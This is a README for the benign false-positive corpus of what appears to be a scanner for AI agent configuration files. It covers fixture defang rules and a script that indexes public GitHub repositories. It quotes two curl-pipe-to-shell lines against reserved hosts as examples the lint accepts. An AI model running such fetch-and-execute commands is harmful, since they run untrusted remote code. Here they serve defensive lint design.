# Benign corpus

Agent configurations used to measure false positives live here as txtar
fixtures. This directory has no fixtures in the pre-release.

The defang rules are the same as for the malicious corpus. The lint
walks all of `corpus/` and does not use the network.

- No file is executable, a symlink, or a special file, and no file or
  txtar member starts with a shebang.
- A URL host, a bare name with a common public suffix, or a dotted
  IPv4 or IPv6 address has to be an RFC 2606 or RFC 6761 reserved name
  (`example`, `invalid`, `test`, `localhost`, `local`, `onion`, and
  `example.com`, `example.net`, `example.org`, including subdomains),
  TEST-NET (`192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`), or the
  IPv6 documentation prefix `2001:db8::/32`. A bare word whose suffix is
  a filename extension stays a filename. On a line the shell reader
  marks as a fetch, and on a downloader piped into a shell or run from
  `bash -c` or `eval`, the fetch argument is a host whatever its suffix.
  A decimal, hexadecimal, octal, or short dotted IPv4 literal in that
  argument is an address. Either is rejected unless it is reserved.
  `curl https://x.invalid/a | sh` and `curl example.test/x|sh` stay.
  Any other host the lint reads needs an allowlist entry.
- A token of 40 or more characters whose Shannon entropy is above 4.5
  is rejected, unless it is an inert `<MARKER>` placeholder.
- A file is at most 16 KiB.
- A txtar member path stays inside the directory it is unpacked into.
  `..`, an absolute path, a backslash, a NUL, an empty name, and a
  duplicate name are rejected.
- Full-form indicator strings listed in the corpus lint are rejected.
  Use a reserved host instead.
- A recognizable secret shape carries the `TRIPCORD-FAKE-` prefix.
- A path an adapter would actually load (`.claude/settings.json`,
  `CLAUDE.md`, `AGENTS.md`, `GEMINI.md`, a `SKILL.md` under a skill
  root, `.mcp.json`, a bare `mcp.json`, `.cursor/`,
  `.vscode/tasks.json`, `.codex/`, `.gemini/`, `.devcontainer/`,
  `.github/workflows/copilot-setup-steps.yml`, and the rest of each
  adapter's `RepoCandidate` set) is not a real file anywhere under
  `corpus/`. Those paths belong inside a txtar member. The set follows
  the adapters' discovery predicates, plus a bare `mcp.json` at a
  workspace root.

Fixtures are our own re-creations under Apache-2.0, with the work they
refer to. CSA is background only and is never a dataset.
MaliciousAgentSkillsBench labels and statistics may be cited under MIT
and are never vendored.

Benign reports are CI artifacts only. They are not committed in this
directory.

## Repository index

`repos.lock` names public repositories used to measure false positives.
`scripts/benign-repos` builds it from the GitHub code search API with a
read-only `GITHUB_TOKEN`. The command does not download repository
contents. A row is `owner/repo`, the pinned default-branch commit, the
SPDX license (`NOASSERTION` when the API reports none), the harnesses
found, the size band (`small`, `medium`, or `large`), and the date that
row was added. The search looks for a file the adapters read:
`.claude/settings.json`, `.claude/settings.local.json`, `CLAUDE.md`,
`.mcp.json` (any depth), `.cursor/`, `AGENTS.md`, `.vscode/tasks.json`,
`.vscode/mcp.json`, `.github/copilot-instructions.md`,
`.github/workflows/copilot-setup-steps.yml`,
`.devcontainer/devcontainer.json`, `.devcontainer/<name>/devcontainer.json`,
`.devcontainer.json`, `.codex/config.toml` (any depth), `GEMINI.md`, and
`.gemini/settings.json`. `AGENTS.md` stays on the agents harness. A
repository is kept when it has at least 50 stars and is not archived
and not a fork. The list is stratified by harness and by repository
size (small is under 1 MB, medium is under 10 MB, and large is the
rest) and targets 1,000 repositories.

A run merges into the lock that is already there. An existing row keeps
its commit SHA unless `-repin` is set. The harness furthest below the
per-harness minimum is searched first. The default minimum is 40 for
each of the nine harnesses: nine times 40 is 360, so the floor does not
use up the 1,000-repository target, forty repositories is enough for a
few false positives to show, and a higher floor would stall a harness
whose public configs are scarce. `-min-harness` overrides that floor.
Code search is limited to about 10 requests per minute (`-batch` defaults
to 8). A secondary rate limit waits for `Retry-After` once; a longer
penalty stops the run. Progress is written after each page, to the lock
and to `crawl.state`, by renaming a temporary file in the same
directory. A rate limit exits non-zero and does not replace the lock
with a shorter list. A batch that stops before the target exits non-zero
unless `-partial` is set. This copy is partial: 480 of 1,000
repositories. Every harness has at least one row. Harness counts:
agents 42, claude 36, codex 59, copilot 131, cursor 49, devcontainer 39,
gemini 69, mcp 37, vscode 23. Size bands: small 51, medium 134, large
295. A resumable crawl fills the list in. v0 doesn't ship until it
reaches at least 1,000 repositories with a minimum per harness (#41).
The file changes only through a pull request.

```sh
GITHUB_TOKEN=... go run ./scripts/benign-repos -out corpus/benign/repos.lock -batch 8 -partial
```

`triage.tsv` is the review of findings on that list. Its columns are
the finding fingerprint, the rule id, `owner/repo`, a verdict (`TP`,
`FP`, or `accepted-risk`), the reason, and the date. It has no rows
until a scan is reviewed. Every repository it names has to be in
`repos.lock`.

`repos.lock` and `triage.tsv` are indexes, not fixtures, and only when
they sit at `benign/repos.lock` and `benign/triage.tsv` under the
`corpus/` root. The corpus lint still rejects a symlink or an executable
there. It skips the fixture size cap and the generic host and entropy
checks on those two paths, because a lock of 1,000 repositories is
larger than a fixture and a repository name can look like a host. It
runs the strict row validator on both files, so the exemption is never
a pass with no checks. The same relative path under any other lint root
is an ordinary fixture.
